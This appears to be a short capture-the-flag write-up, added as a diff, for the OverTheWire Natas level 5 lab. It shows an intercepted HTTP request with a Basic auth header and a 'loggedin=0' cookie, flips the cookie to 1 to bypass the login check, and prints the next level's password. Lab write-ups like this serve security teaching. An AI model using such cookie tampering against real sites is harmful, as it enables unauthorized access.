@@ -1,0 +1,24 @@
+Here we'll be using burp again.
+
+The page pompted us with the following message: 
+	"Access disallowed. You are not logged in"
+
+So let's take a look at the request and headers we're sending
+
+GET / HTTP/1.1
+
+Host: natas5.natas.labs.overthewire.org
+
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: loggedin=0
+Connection: close
+
+
+Well what happens if instead of value 0 in the "Cookie" header, we insert a 1?
+	-> Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
